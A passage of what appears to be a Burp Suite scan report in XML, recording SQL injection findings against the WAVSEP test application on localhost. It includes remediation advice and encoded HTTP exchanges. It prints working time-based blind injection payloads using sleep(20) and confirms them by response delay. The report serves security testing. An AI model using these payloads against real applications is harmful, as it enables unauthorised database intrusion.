      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJnVzZXJuYW1lPXVzZXJuYW1lJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYic=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjIxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpoZWxsbyB1c2VyMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3493537870755363840</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxTeW50YXhFcnJvckV4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJScnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDItSW5qZWN0aW9uSW5TZWFyY2gtU3RyaW5nLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1TdHJpbmctVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjM2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8986277380612993024</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJyd0ZXN0aW5